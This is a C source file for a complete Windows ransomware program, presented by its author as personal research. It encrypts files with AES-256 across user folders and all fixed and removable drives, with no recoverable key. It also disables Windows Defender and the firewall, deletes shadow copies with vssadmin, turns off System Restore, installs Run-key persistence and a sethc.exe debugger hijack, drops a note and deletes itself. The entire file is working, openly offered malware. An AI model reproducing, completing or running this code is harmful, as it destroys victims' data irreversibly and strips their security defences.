/*
 * misery.c 
 * Author  : Jahanzaib Ashraf Mir
 * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
 *
 * Notes   :
 *   - Personal research project
 *   - Focused on systems-level programming and Windows internals
 *
 * Contact :
 *   GitHub  : https://github.com/jahanzaibmir
 *   LinkedIn : https://linkedin.com/jahanzaibmir
 *   InstaGram : https://instagram.com/jahanzaibmir_
 */

#define _WIN32_WINNT 0x0601 // Windows 7+
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <process.h>
#include <lm.h>
#include <winsvc.h>

/* 
 * EXTENSIONS TO TARGET
 */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".exe",".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",
    ".dll",".msi",".bat",".cmd",".ps1",".vbs",".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn", NULL
};

/* 
 * CRYPTO ENGINE (AES-256 CBC with IV)
*/
#define AES_IV_SIZE      16
#define AES_BLOCK_SIZE   16
#define AES_PAD_HEADROOM (AES_BLOCK_SIZE * 2)
#define ENC_EXT          ".encrypted"
#define ENC_EXT_LEN      10
#define MAX_FPATH        (MAX_PATH * 2)
#define MAX_DEPTH        32
 
/*  Directories to not TARGET*/
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    NULL
};
 
/* Context: replaces g_hProv + g_hAESKey + g_iv globals  */
typedef struct {
    HCRYPTPROV hProv;
    HCRYPTKEY  hKey;
} CRYPTO_CTX;
 
/* ── Single global ctx (drop-in for original globals) ────────── */
static CRYPTO_CTX g_ctx = {0, 0};
 

 /*  InitCrypto
 */
static int InitCrypto(void) {
    if (!CryptAcquireContextA(&g_ctx.hProv, NULL, NULL,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return 0;
 
    if (!CryptGenKey(g_ctx.hProv, CALG_AES_256,
                     CRYPT_EXPORTABLE, &g_ctx.hKey)) {
        CryptReleaseContext(g_ctx.hProv, 0);
        g_ctx.hProv = 0;
        return 0;
    }
    // No global IV — generated fresh per file inside DoEncryptFile
    return 1;
}
 
/*
 *  CleanupCrypto
  */
static void CleanupCrypto(void) {
    if (g_ctx.hKey)  { CryptDestroyKey(g_ctx.hKey);        g_ctx.hKey  = 0; }
    if (g_ctx.hProv) { CryptReleaseContext(g_ctx.hProv, 0); g_ctx.hProv = 0; }
}

/* DoEncryptFile*/

static void DoEncryptFile(const char *path) {
    HANDLE hFile  = INVALID_HANDLE_VALUE;
    HANDLE hWrite = INVALID_HANDLE_VALUE;
    BYTE  *buf    = NULL;
    DWORD  bufSize = 0;
 
    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
 
    DWORD fs = GetFileSize(hFile, NULL);
    if (fs == INVALID_FILE_SIZE || fs < 1) goto cleanup;
 
    // IV slot + plaintext + 2-block PKCS#7 headroom
    bufSize = AES_IV_SIZE + fs + AES_PAD_HEADROOM;
    buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) goto cleanup;
 
    // Read plaintext into buf[AES_IV_SIZE..]
    DWORD rd = 0;
    if (!ReadFile(hFile, buf + AES_IV_SIZE, fs, &rd, NULL) || rd != fs)
        goto cleanup;
 
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
 
    // Generate fresh random IV for this file
    BYTE iv[AES_IV_SIZE];
    if (!CryptGenRandom(g_ctx.hProv, AES_IV_SIZE, iv)) goto cleanup;
 
    // Apply IV to key object — THIS was missing in the original!
    if (!CryptSetKeyParam(g_ctx.hKey, KP_IV, iv, 0)) goto cleanup;
 
    // Encrypt in-place at buf[AES_IV_SIZE..]
    DWORD encLen = rd;
    if (!CryptEncrypt(g_ctx.hKey, 0, TRUE, 0,
                      buf + AES_IV_SIZE, &encLen,
                      fs + AES_PAD_HEADROOM))
        goto cleanup;
 
    // Prepend IV into buf[0..15]
    memcpy(buf, iv, AES_IV_SIZE);
 
    // Atomic write: temp file first, then rename over original
    char tmpPath[MAX_FPATH];
    snprintf(tmpPath, sizeof(tmpPath) - 1, "%s.tmp", path);
 
    hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
                         NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;
 
    DWORD wr = 0;
    DWORD totalOut = AES_IV_SIZE + encLen;
    if (!WriteFile(hWrite, buf, totalOut, &wr, NULL) || wr != totalOut) {
        CloseHandle(hWrite);
        hWrite = INVALID_HANDLE_VALUE;
        DeleteFileA(tmpPath);
        goto cleanup;
    }
 
    CloseHandle(hWrite);
    hWrite = INVALID_HANDLE_VALUE;
 
    if (!MoveFileExA(tmpPath, path, MOVEFILE_REPLACE_EXISTING))
        DeleteFileA(tmpPath);
 
cleanup:
    if (buf) {
        SecureZeroMemory(buf, bufSize);   // wipe plaintext from memory
        VirtualFree(buf, 0, MEM_RELEASE);
    }
    if (hFile  != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hWrite != INVALID_HANDLE_VALUE) CloseHandle(hWrite);
}
 
/* 
 *  ShouldSkipDir
 **/
static int ShouldSkipDir(const char *fullPath) {
    for (int i = 0; g_skip[i]; i++) {
        if (strstr(fullPath, g_skip[i])) return 1;
    }
    return 0;
}
 
/* 
 *  EncryptDir  —  recursive directory walker
 */
static void EncryptDir(const char *dir, int depth) {
    if (depth > MAX_DEPTH)   return;
    if (ShouldSkipDir(dir))  return;
 
    char pattern[MAX_FPATH];
    snprintf(pattern, sizeof(pattern) - 1, "%s\\*", dir);
 
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
 
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;
 
        char full[MAX_FPATH];
        int written = snprintf(full, sizeof(full) - 1,
                               "%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(sizeof(full) - 1))
            continue;  // path too long, skip safely
 
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDir(full, depth + 1);
        } else {
            // Skip if already has .encrypted suffix
            size_t flen = strlen(full);
            if (flen > ENC_EXT_LEN &&
                _stricmp(full + flen - ENC_EXT_LEN, ENC_EXT) == 0)
                continue;
 
            // Check extension whitelist
            const char *ext = strrchr(full, '.');
            if (!ext) continue;
 
            int match = 0;
            for (int i = 0; g_ext[i]; i++) {
                if (_stricmp(ext, g_ext[i]) == 0) { match = 1; break; }
            }
            if (!match) continue;
 
            // Guard: skip if .encrypted counterpart already exists
            char encPath[MAX_FPATH];
            snprintf(encPath, sizeof(encPath) - 1, "%s%s", full, ENC_EXT);
            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                continue;
 
            // Encrypt then rename
            DoEncryptFile(full);
            MoveFileExA(full, encPath, MOVEFILE_REPLACE_EXISTING);
        }
    } while (FindNextFileA(hFind, &fd));
 
    FindClose(hFind);
}
 
/* 
 * DIRECT API EXECUTION
*/

// Helper to stop/disable service directly
static void ManageService(const char *svcName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if(!hSCM) return;
    
    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);
    if(hSvc) {
        SERVICE_STATUS ss;
        // Stop service
        ControlService(hSvc, SERVICE_STOP, &ss);
        
        // Disable service (start type disabled)
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
}

static void KillSecurityDirect() {
    // Directly manipulate registry and services without cmd.exe
    
    HKEY hk;
    DWORD val = 1;
    
    // Disable Defender via Registry
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);

    // Stop Services directly
    ManageService("WinDefend");
    ManageService("SecurityHealthService");
    ManageService("WdNisSvc");
    ManageService("Sense");
    
    // Disable Firewall via Registry
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_SET_VALUE, &hk);
    val = 0; // OFF
    RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
}

static void NukeBackupsDirect() {
    // Disable System Restore via Registry
    HKEY hk;
    DWORD val = 1;
    
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\System\\Restore", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
    
    // Clear Shadow Copies using CreateProcess for speed
    STARTUPINFOA si_start = {0}; 
    PROCESS_INFORMATION pi;
    char cmd[] = "vssadmin delete shadows /all /quiet";
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

static void InstallPersistenceDirect() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Registry Run Keys
    HKEY hk;
    
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hk);
    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // Sticky Keys Hijack
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", 0, KEY_SET_VALUE, &hk);
    char debugger[MAX_PATH];
    strcpy(debugger, exePath);
    RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)debugger, strlen(debugger)+1);
    RegCloseKey(hk);
}

static void DropNoteDirect() {
    char note[2048];
    char mid[128];
    
    HKEY hk;
    DWORD sz = sizeof(mid);
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "MachineGuid", NULL, NULL, (BYTE*)mid, &sz);
        RegCloseKey(hk);
    } else {
        snprintf(mid, sizeof(mid), "%08lx", GetCurrentProcessId());
    }

   snprintf(note, sizeof(note),
    "\r\n"
    "  YO! Jahanzaib IS DaMN good"
    "\r\n", mid);

    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
    
    char fp[MAX_PATH * 2];
    snprintf(fp, sizeof(fp), "%s\\README.txt", path);
    
    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, note, strlen(note), &w, NULL);
        CloseHandle(hF);
    }
}

/*
 * MAIN LOGIC
 *  */

typedef struct { int id; } THD;

static unsigned __stdcall Worker(void *arg) {
    char buf[MAX_PATH];
    
    // Encrypt User Folders
    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf)==S_OK)       EncryptDir(buf, 0);
    if(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf)==S_OK)   EncryptDir(buf, 0);
    // CSIDL_DOWNLOADS is 0x0015
    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf)==S_OK)             EncryptDir(buf, 0);
    
    // Encrypt Drives
    for(char d='C'; d<='Z'; d++) {
        char root[4] = {d,':','\\',0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
            EncryptDir(root, 0);
        }
    }
    return 0;
}

static void ElevatePrivs() {
    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;

    const char *privs[] = {"SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege", "SeTakeOwnershipPrivilege", NULL};
    for(int i=0; privs[i]; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    CloseHandle(hToken);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Single Instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\StashCat_V2");
    if(!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if(hMutex) CloseHandle(hMutex);
        return 0;
    }

    ElevatePrivs();
    
    // Fast Security Kill (No CMD noise)
    KillSecurityDirect();
    NukeBackupsDirect();
    
    // Crypto Init
    if(!InitCrypto()) { 
        CloseHandle(hMutex); 
        return 1; 
    }

    // Parallel Encryption
    SYSTEM_INFO si_sys; // Renamed to 'si_sys' to avoid conflict with STARTUPINFO 'si'
    GetSystemInfo(&si_sys);
    int n = si_sys.dwNumberOfProcessors * 2;
    if(n > 8) n = 8; // Cap threads
    
    HANDLE threads[8];
    THD tdata[8];
    
    // Start encryption threads
    for(int i=0; i<n; i++) {
        tdata[i].id = i;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, Worker, &tdata[i], 0, NULL);
    }
    
    WaitForMultipleObjects(n, threads, TRUE, 180000); // 3 mins timeout
    
    for(int i=0; i<n; i++) CloseHandle(threads[i]);

    // Persistence & Note
    InstallPersistenceDirect();
    DropNoteDirect();

    // Cleanup Crypto

    CleanupCrypto();

    // Self Delete (Robust)
    char exeP[MAX_PATH];
    GetModuleFileNameA(NULL, exeP, MAX_PATH);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 3 & del /f /q \"%s\"", exeP);
    
    // Renamed local variable 'si' to 'si_start' to avoid conflict with SYSTEM_INFO si_sys
    STARTUPINFOA si_start = {0}; 
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
    
    CloseHandle(hMutex);
    return 0;
}


